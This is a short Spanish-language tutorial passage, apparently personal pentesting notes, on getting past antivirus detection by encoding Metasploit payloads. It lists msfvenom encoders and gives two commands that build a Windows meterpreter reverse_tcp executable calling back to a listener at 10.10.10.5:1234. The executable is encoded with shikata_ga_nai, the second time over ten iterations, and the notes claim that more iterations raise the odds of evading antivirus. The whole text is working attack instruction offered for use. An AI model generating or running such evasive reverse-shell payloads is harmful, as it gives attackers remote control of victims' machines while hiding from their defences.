Para evitar la deteccion de antivirus lo mas comun es encodear los payloads para cambiar la firma del payload para no ser detectado

```
$ msfvenom --list encoders   #Muestra la lista de los encoders disponibles en msfvenom

 Name                          Rank       Description
    ----                          ----       -----------
    cmd/base64                    good       Base64 Command Encoder
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder

De los mas utilizados es x86/shikata_ga_nai    

#Creamos el payload encodeado con el parametro -e

kalLi:~/Desktop$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe

#Mientras mas veces se itere el encode con shikata_ga_nai mas chance de no ser detectado por AV
parametro -i

kalLi:~/Desktop$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
```
